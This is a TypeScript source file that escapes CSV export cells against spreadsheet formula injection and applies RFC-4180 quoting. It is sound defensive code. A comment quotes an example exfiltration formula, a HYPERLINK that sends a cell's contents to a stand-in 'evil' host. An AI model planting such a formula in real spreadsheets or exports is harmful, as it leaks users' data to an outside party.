// Shared CSV serialization for the studio data export
// (app/(app)/settings/data/actions.ts). Extracted so the single cell-escaping
// chokepoint is unit-testable and reused by every export path.
//
// csvCell does two things, in order:
//   1. CSV FORMULA-INJECTION NEUTRALIZATION (OWASP): a TEXT value whose first
//      character is a spreadsheet formula trigger — `=`, `+`, `-`, `@`, TAB
//      (\t), or CR (\r) — is prefixed with a single quote (') so Excel / Google
//      Sheets / LibreOffice render it as literal text and NEVER execute it
//      (e.g. a client note of `=HYPERLINK("http://evil?"&A1,"x")` can no longer
//      run when the owner opens the export). Only text-origin values are
//      guarded; numbers/booleans are left intact so numeric columns (including
//      negative amounts) still export as real numbers.
//   2. RFC-4180 quoting: values containing a comma, double-quote, CR, or LF are
//      wrapped in double quotes, with embedded quotes doubled.

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s: string;
  let textOrigin: boolean;
  if (typeof value === "string") {
    s = value;
    textOrigin = true;
  } else if (typeof value === "object") {
    // Arrays/objects are JSON-encoded (start with `[`/`{`, never a trigger),
    // but treat as text-origin defensively.
    s = JSON.stringify(value);
    textOrigin = true;
  } else {
    // number / boolean / bigint — never a formula vector; preserve as-is so
    // numeric cells (incl. negatives like -50) stay numeric, not text.
    s = String(value);
    textOrigin = false;
  }
  // 1. Formula-injection neutralization (text-origin values only).
  if (textOrigin && FORMULA_TRIGGER.test(s)) {
    s = `'${s}`;
  }
  // 2. RFC-4180 quoting.
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export function rowsToCsv(
  headers: ReadonlyArray<string>,
  rows: ReadonlyArray<Record<string, unknown>>,
): string {
  const lines = [headers.map(csvCell).join(",")];
  for (const row of rows) {
    lines.push(headers.map((h) => csvCell(row[h])).join(","));
  }
  // Trailing newline so downstream tools recognize the last row consistently.
  return `${lines.join("\n")}\n`;
}
